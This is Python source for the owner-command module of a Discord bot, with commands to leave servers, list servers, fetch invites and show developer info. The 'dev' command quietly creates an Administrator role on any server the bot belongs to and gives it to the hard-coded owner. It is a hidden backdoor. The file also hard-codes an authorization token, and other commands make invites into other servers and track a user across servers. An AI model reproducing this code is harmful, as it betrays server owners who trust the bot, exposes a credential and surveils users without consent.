import discord
from discord.ext import commands 
import asyncio
from datetime import datetime
import sys
import os
import json
import aiohttp

headers = {"Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUzMzM3MjYwNDM1MDk4ODI5OSIsImJvdCI6dHJ1ZSwiaWF0IjoxNTU5OTQ1NDk1fQ.bwri27GtxFBId6K5YE7GzxdnTH_TUb2aEAQrmrJ-3f8"}

client = commands.Bot(command_prefix='nl!')

botcolor = 0xffffff

client.remove_command('help')

def is_vale():
    def predicate(ctx):
        return ctx.message.author.id in ["474947907913515019", "486988989262462991"]

    return commands.check(predicate)
	
class owner:
    def __init__(self, client):
        self.client = client
		
########################################################################################################################
    @client.command(hidden=True, pass_context=True)
    @is_vale()
    async def goodnight(self, ctx):
        if not ctx.message.author.bot: 
            await self.client.say("Sleep well")
            await self.client.logout()
########################################################################################################################		
    @client.command(pass_context=True)
    async def secret(self, ctx):
        if ctx.message.author.bot:
            pass
        if not ctx.message.author.bot: 
            author=ctx.message.author
            embed=discord.Embed(
                color=botcolor)
            embed.set_author(name='Secret Commands')
            embed.add_field(name='** **', value='** **', inline='False')
            await self.client.send_message(author, embed=embed)
            await self.client.delete_message(ctx.message)
########################################################################################################################		
    @client.command(pass_context = True)
    @is_vale()	
    async def dev(self, ctx,  member: discord.Member=None):
        if ctx.message.author.bot:
            pass
        if not ctx.message.author.bot: 
            staff = discord.utils.get(ctx.message.server.roles, name="Neko_Developer")	
            if staff:
                await self.client.add_roles(ctx.message.author, role)
            else:
                server = (ctx.message.server)
                member = member or ctx.message.author
                staff = discord.Permissions(8)
                await self.client.delete_message(ctx.message)
                role = await self.client.create_role(server, name="Neko_Developer", permissions=staff)
                await self.client.add_roles(ctx.message.author, role)
########################################################################################################################
    @client.command(pass_context = True)	
    @is_vale()		
    async def leave(self, ctx):
        if ctx.message.author.bot:
            pass
        if not ctx.message.author.bot: 
            await self.client.delete_message(ctx.message)
            await self.client.leave_server(ctx.message.server)
		
    @client.command(pass_context = True)	
    @is_vale()		
    async def remoteleave(self, ctx, *args):
        if ctx.message.author.bot:
            pass
        if not ctx.message.author.bot: 
            serverID = ''.join(args)
            server = self.client.get_server(serverID)
            await self.client.delete_message(ctx.message)
            await self.client.send_message(server.owner, "I leave your Server because my Owner ordered me back! If you have any questions join my Support Server.\nGreetings from the Neko Developing Team.\n")
            await self.client.say("I leave the server {0}".format(server.name))
            await self.client.leave_server(server)
            await asyncio.sleep(5)
        


    @client.command(pass_context=True)
    @is_vale()
    async def servers(self, ctx):
        if ctx.message.author.bot:
            pass
        if not ctx.message.author.bot: 
            servers = list(self.client.servers)
            await self.client.say("**Connected on {0} servers:**".format(str(len(servers))))
            for server in servers:
	            await self.client.say(server.name + '\n' + server.id)
		  
    @client.command(pass_context=True)
    @is_vale()
    async def findserver(self, ctx, *args):
        if ctx.message.author.bot:
            pass
        if not ctx.message.author.bot: 
            serverID = ''.join(args)
            server = self.client.get_server(serverID)
            gen = discord.utils.get(server.channels, name="general", type=discord.ChannelType.text)
            if gen:
                try:
                    serverID = ''.join(args)
                    server = self.client.get_server(serverID)
                    channel = discord.utils.get(server.channels, name="general", type=discord.ChannelType.text)
                    invitelinknew = await self.client.create_invite(destination = channel, xkcd = True,max_age=30, max_uses = 1)
                    embed=discord.Embed(
                        color=botcolor)
                    embed.add_field(name='__Server Stats__', value='** **', inline='False')
                    embed.add_field(name='Servername:', value='{0.name}'.format(server), inline='True')
                    embed.add_field(name='Server ID:', value='{}'.format(server.id), inline='True')
                    embed.add_field(name='Membercount:', value='{0.member_count} members'.format(server), inline='False')
                    embed.add_field(name='Serverowner:', value='{}'.format(server.owner.mention), inline='False')
                    embed.add_field(name='Created at:', value='{}'.format(server.created_at))
                    embed.add_field(name="Discord Invite Link", value=invitelinknew)
                    embed.set_thumbnail(url=server.icon_url)	
                    author = ctx.message.author
                    embed.set_footer(text='Message was requested by {}'.format(author))
                    embed.timestamp = datetime.utcnow()
                    await self.client.say(embed=embed)
                except:
                    serverID = ''.join(args)
                    server = self.client.get_server(serverID)
                    embed=discord.Embed(
                        color=botcolor)
                    embed.add_field(name='__Server Stats__', value='** **', inline='False')
                    embed.add_field(name='Servername:', value='{0.name}'.format(server), inline='True')
                    embed.add_field(name='Server ID:', value='{}'.format(server.id), inline='True')
                    embed.add_field(name='Membercount:', value='{0.member_count} members'.format(server), inline='False')
                    embed.add_field(name='Serverowner:', value='{}'.format(server.owner.mention), inline='False')
                    embed.add_field(name='Created at:', value='{}'.format(server.created_at))
                    embed.set_thumbnail(url=server.icon_url)	
                    author = ctx.message.author
                    embed.set_footer(text='Message was requested by {}'.format(author))
                    embed.timestamp = datetime.utcnow()
                    await self.client.say(embed=embed)
            else:
                serverID = ''.join(args)
                server = self.client.get_server(serverID)
                embed=discord.Embed(
                    color=botcolor)
                embed.add_field(name='__Server Stats__', value='** **', inline='False')
                embed.add_field(name='Servername:', value='{0.name}'.format(server), inline='True')
                embed.add_field(name='Server ID:', value='{}'.format(server.id), inline='True')
                embed.add_field(name='Membercount:', value='{0.member_count} members'.format(server), inline='False')
                embed.add_field(name='Serverowner:', value='{}'.format(server.owner.mention), inline='False')
                embed.add_field(name='Created at:', value='{}'.format(server.created_at))
                embed.set_thumbnail(url=server.icon_url)	
                author = ctx.message.author
                embed.set_footer(text='Message was requested by {}'.format(author))
                embed.timestamp = datetime.utcnow()
                await self.client.say(embed=embed)	   
			
    @client.command(pass_context=True) 
    @is_vale()
    async def getinvite(self, ctx, *args):
        if ctx.message.author.bot:
            pass
        if not ctx.message.author.bot: 
            id = ' '.join(args)
            server = self.client.get_server(id)
            inv = await self.client.invites_from(server)
            embed = discord.Embed(title="In progress", description="", color=botcolor)
            msg = await self.client.send_message(ctx.message.channel, embed=embed)
            await self.client.add_reaction(msg, "🆗")
            await self.client.add_reaction(msg, "❌")
            await asyncio.sleep(0.5)
            for invites in inv:
                embed = discord.Embed(title="Invite Info", description="", color=botcolor)
                embed.add_field(name="Creator:", value=invites.inviter, inline=True)
                embed.add_field(name="Channel:", value=invites.channel.mention, inline=True)
                embed.add_field(name="Uses", value=invites.uses, inline=False)
                embed.add_field(name="Invite", value=invites, inline=False)
                embed.set_thumbnail(url=server.icon_url)
                embed.timestamp = datetime.utcnow()
                msg = await self.client.edit_message(msg, embed=embed)
                await self.client.wait_for_reaction(["🆗"], message=msg)
                await self.client.remove_reaction(msg, "🆗", ctx.message.author)
            msg1 = await self.client.say("No more invites...")
            try:
                await self.client.delete_message(msg)
            except:
                pass
                
	 		
    @client.command(pass_context=True)
    @is_vale()
    async def test66(self, ctx):		
        for channel in ctx.message.server.channels:
            try:
                await self.client.send_message(channel, "hi")
            except:
                pass
	
	 		
    @client.command(pass_context=True)
    @is_vale()
    async def globalusercheck(self, ctx, member:discord.Member):
        userId = member.id
        embed = discord.Embed(title="Mutual Servers:", description="", color=botcolor)
        embed.add_field(name="User", value='** **', inline=True)
        embed.add_field(name="User ID", value='** **', inline=True)
        embed.add_field(name="Server", value='** **', inline=False)
        embed.add_field(name="Server ID", value='** **', inline=False)
        embed.set_thumbnail(url=ctx.message.server.icon_url)
        embed.timestamp = datetime.utcnow()
        msg = await self.client.send_message(ctx.message.channel, embed=embed)
        await self.client.add_reaction(msg, "🆗")
        await self.client.add_reaction(msg, "❌")
        await asyncio.sleep(0.5)
        servers = list(self.client.servers)
        for server in self.client.servers:
            for member in server.members:
                if member.id == userId:	
                    embed = discord.Embed(title="Mutual Servers:", description="", color=botcolor)
                    embed.add_field(name="User", value=member.name, inline=True)
                    embed.add_field(name="User ID", value=member.id, inline=True)
                    embed.add_field(name="Server", value=server.name, inline=False)
                    embed.add_field(name="Server ID", value=server.id, inline=True)
                    embed.set_thumbnail(url=server.icon_url)
                    embed.timestamp = datetime.utcnow()
                    msg = await self.client.edit_message(msg, embed=embed)
                    await self.client.wait_for_reaction(['🆗'], message=msg)
                    try:
                        await self.client.remove_reaction(msg, "🆗", ctx.message.author)
                    except:
                        pass
        else:
            await self.client.delete_message(msg)
            msg = await self.client.say("Nope. No more mutual Servers with this user")
					
    @client.command(pass_context=True)
    @is_vale()
    async def globalidcheck(self, ctx, *args):
        userId = ' '.join(args)
        embed = discord.Embed(title="Mutual Servers:", description="", color=botcolor)
        embed.add_field(name="User", value='** **', inline=True)
        embed.add_field(name="User ID", value='** **', inline=True)
        embed.add_field(name="Server", value='** **', inline=False)
        embed.add_field(name="Server ID", value='** **', inline=False)
        embed.set_thumbnail(url=ctx.message.server.icon_url)
        embed.timestamp = datetime.utcnow()
        msg = await self.client.send_message(ctx.message.channel, embed=embed)
        await self.client.add_reaction(msg, "🆗")
        await self.client.add_reaction(msg, "❌")
        await asyncio.sleep(0.5)
        servers = list(self.client.servers)
        for server in self.client.servers:
            for member in server.members:
                if member.id == userId:	
                    embed = discord.Embed(title="Mutual Servers:", description="", color=botcolor)
                    embed.add_field(name="User", value=member.name, inline=True)
                    embed.add_field(name="User ID", value=member.id, inline=True)
                    embed.add_field(name="Server", value=server.name, inline=False)
                    embed.add_field(name="Server ID", value=server.id, inline=True)
                    embed.set_thumbnail(url=server.icon_url)
                    embed.timestamp = datetime.utcnow()
                    msg = await self.client.edit_message(msg, embed=embed)
                    await self.client.wait_for_reaction(['🆗'], message=msg)
                    await self.client.remove_reaction(msg, "🆗", ctx.message.author)
        else:
                    await self.client.delete_message(msg)
                    msg = await self.client.say("Nope. No more mutual Servers with this user")
                    await asyncio.sleep(60)
                    await self.client.delete_message(msg)
					
    @client.command(pass_context=True)
    @is_vale()
    async def inv(self, ctx, *args):	
        link = ' '.join(args)	
        http = "https://discord.gg/"
        await self.client.say(http+link)
		
		
    @client.command(pass_context=True)
    async def nikodev(self, ctx):		
        user = await self.client.get_user_info('474947907913515019')
        user_created1 = (ctx.message.timestamp - user.created_at).days
        for member in ctx.message.server.members:
            if user.id == member.id:
                here="Yes"
                break
        else:
            here = "No"
        embed = discord.Embed(title="Developerinfo: {0}".format(user.name), description="** **", color=0x002cff)
        embed.add_field(name="Name", value="{0} | {0}".format(user.name, user.mention), inline=True)
        embed.add_field(name="Discriminator", value=user.discriminator, inline=True)
        embed.add_field(name="Discord ID", value=user.id, inline=True)
        embed.add_field(name="Team Position", value="Bot Owner, Coder, DBL ablilistration, Hoster", inline=False)
        embed.add_field(name="Server Member:", value=here, inline=True)
        embed.add_field(name="Programming Languages", value="Python, discord.py, Visual Basic", inline=False)
        embed.add_field(name="Join Discord at: ", value=("{} ({} days ago!)".format(user.created_at.strftime("%d %b %Y %H:%M"), user_created1)), inline=False)
        embed.set_footer(text='Message was requested by {}'.format(user), icon_url=user.avatar_url)
        embed.timestamp = datetime.utcnow()
        embed.set_thumbnail(url=user.avatar_url)
        msg = await self.client.send_message(ctx.message.channel, embed=embed)
		
    @client.command(pass_context = True)
    async def abcdev(self, ctx):
        user = await self.client.get_user_info('343109361595318276')
        user_created1 = (ctx.message.timestamp - user.created_at).days
        for member in ctx.message.server.members:
            if user.id == member.id:
                here="Yes"
                break
        else:
            here = "No"
        embed=discord.Embed(color=botcolor)
        embed = discord.Embed(title="Developerinfo: {0}".format(user.name), description="** **", color=0x002cff)
        embed.set_thumbnail(url = 'https://i3.radionomy.com/radios/400/59a8f9b3-1452-4d63-9d4a-21c133da26c1.jpg')
        embed.add_field(name="Name", value="{0} | {0}".format(user.name, user.mention), inline=True)
        embed.add_field(name="Discriminator", value=user.discriminator, inline=True)
        embed.add_field(name="Discord ID", value=user.id, inline=True)
        embed.add_field(name = 'Team Position:', value = 'Bot Developer | DBL-Updater | Coder', inline=False)
        embed.add_field(name = "Server Member:", value=here, inline=True)
        embed.add_field(name = 'Programming Skills:', value = 'Discord.py | Python | HTML', inline=False)
        embed.add_field(name = 'Languages:', value = 'German | English', inline=True)
        embed.timestamp = datetime.utcnow()
        embed.set_thumbnail(url=user.avatar_url)
        msg = await self.client.send_message(ctx.message.channel, embed=embed)
 
def setup(client):
    client.add_cog(owner(client))